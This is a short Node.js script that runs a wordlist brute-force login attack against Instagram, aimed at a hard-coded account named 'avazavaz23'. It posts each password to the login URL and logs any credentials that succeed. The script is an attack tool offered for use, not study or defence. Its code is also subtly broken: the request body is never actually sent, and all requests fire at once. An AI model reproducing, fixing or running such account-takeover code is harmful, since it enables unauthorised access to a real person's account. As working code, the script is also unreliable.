const https = require('https');
const fs = require('fs');
const wordlistPath = '/home/forever/Desktop/a.txt';
function bruteForceInstagram(username) {
  console.log("start");

  return new Promise((resolve, reject) => {
    fs.readFile(wordlistPath, 'utf8', (err, data) => {
      if (err) {
        reject(err);
      } else {
        const wordlist = data.split('\n');
        wordlist.forEach((password) => {
          const requestOptions = {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `username=${username}&password=${password}`,
          };
          console.log("yooooooooooooooooooooooooooooq",password);

          const req = https.request('https://www.instagram.com/login/', requestOptions, (res) => {
            if (res.statusCode === 200) {
              console.log(`Successfully logged in with ${username} and ${password}.`);
              resolve({ username, password });
            } else if (res.statusCode === 302) {
              console.log(`Redirected to ${res.headers.location}`);
              // Continue to the next password in the wordlist
              return;
            }
          });

          req.on('error', (error) => {
            console.error(`Error while sending request: ${error.message}`);
          });

          req.end();
        });
      }
    });
  });
}

bruteForceInstagram('avazavaz23')
  .then((result) => {
    console.log('Brute force attack successful:', result);
  })
  .catch((error) => {
    console.error('Brute force attack failed:', error);
  });